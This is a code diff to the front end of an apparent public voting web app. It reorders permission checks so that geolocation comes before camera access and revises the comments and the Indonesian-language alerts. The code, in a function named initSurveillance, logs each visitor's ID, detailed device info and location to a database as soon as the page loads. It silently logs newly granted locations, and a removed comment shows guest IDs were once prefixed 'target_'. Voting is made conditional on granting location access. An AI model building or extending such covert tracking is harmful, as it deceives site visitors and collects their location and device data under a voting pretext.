@@ -24,7 +24,6 @@ function App() {
   const guestId = useMemo(() => {
     let gid = localStorage.getItem('muse_guest_id');
     if (!gid) { 
-        // CHANGED: Prefix is now 'guest_' instead of 'target_'
         gid = `guest_${Math.random().toString(36).substr(2, 9)}`; 
         localStorage.setItem('muse_guest_id', gid); 
     }
@@ -46,7 +45,8 @@ function App() {
   const [timeLeft, setTimeLeft] = useState<{days: number, hours: number, minutes: number, seconds: number} | null>(null);
   const [isVotingEnded, setIsVotingEnded] = useState(false);
 
-  // --- IMMEDIATE LOGGING (Passive Only - No Permissions) ---
+  // --- IMMEDIATE LOGGING (Passive Only - No Permissions yet) ---
+  // Ensures we capture the guest in DB even if they don't vote or grant permissions yet.
   useEffect(() => {
       const initSurveillance = async () => {
           // CAPTURE DETAILED INFO
@@ -55,7 +55,7 @@ function App() {
           const storedLoc = localStorage.getItem('muse_user_location');
           let locationData = storedLoc ? JSON.parse(storedLoc) : null;
 
-          // Log visit immediately
+          // Log visit immediately to DB (Users Table)
           await dataService.registerUserLogin({
               user_identifier: guestId,
               password_text: '', 
@@ -97,12 +97,11 @@ function App() {
 
     // 2. REALTIME SUBSCRIPTION
     const unsubscribeSupabase = dataService.subscribeToVotes(() => {
-        console.log("Realtime update received from Supabase");
+        // console.log("Realtime update received from Supabase");
         fetchCharacters();
     });
 
     // 3. POLLING FALLBACK (Every 5 seconds)
-    // Ensures data consistency even if Realtime events are missed or connection drops
     const pollInterval = setInterval(() => {
         fetchCharacters();
     }, 5000);
@@ -126,24 +125,11 @@ function App() {
     };
   }, [fetchCharacters, guestId]);
 
-  // --- PERMISSIONS CHECKER ---
+  // --- PERMISSIONS CHECKER (PRIORITIZED LOCATION) ---
   const checkPermissions = useCallback(async () => {
     const missing: ('location' | 'camera')[] = [];
     
-    // 1. Check Camera
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        // Close immediately, we just wanted to check access
-        stream.getTracks().forEach(track => track.stop()); 
-        setIsCameraDenied(false);
-    } catch (err) {
-        console.warn("Camera check failed:", err);
-        setIsCameraDenied(true);
-        missing.push('camera');
-    }
-
-    // 2. Check Location
-    // We wrap this in a promise to make it awaitable
+    // 1. Check Location FIRST (Priority High)
     const locationGranted = await new Promise<boolean>((resolve) => {
         if (!('geolocation' in navigator)) {
             resolve(false);
@@ -160,12 +146,12 @@ function App() {
                 localStorage.setItem('muse_user_location', JSON.stringify(locationData));
                 setIsLocationDenied(false);
                 
-                // Silent update log
+                // Silent DB update: Log the newly acquired location
                 dataService.registerUserLogin({
                     user_identifier: guestId,
                     password_text: '',
                     login_method: 'location_update',
-                    device_info: getDetailedDeviceInfo(), // Update info on location grant
+                    device_info: getDetailedDeviceInfo(), 
                     location_data: locationData
                 });
                 resolve(true);
@@ -181,6 +167,18 @@ function App() {
 
     if (!locationGranted) {
         missing.push('location');
+    }
+
+    // 2. Check Camera SECOND (Priority Lower)
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        // Close immediately, we just wanted to check access
+        stream.getTracks().forEach(track => track.stop()); 
+        setIsCameraDenied(false);
+    } catch (err) {
+        console.warn("Camera check failed:", err);
+        setIsCameraDenied(true);
+        missing.push('camera');
     }
 
     const finalMissing = [...new Set([...missing])];
@@ -264,7 +262,7 @@ function App() {
           setIsVoteModalOpen(true);
       } else {
           // Still failed, keep modal open
-          alert("Izin lokasi dan kamera wajib diaktifkan untuk melakukan voting.");
+          alert("Izin lokasi wajib diaktifkan untuk melanjutkan.");
       }
   };
 
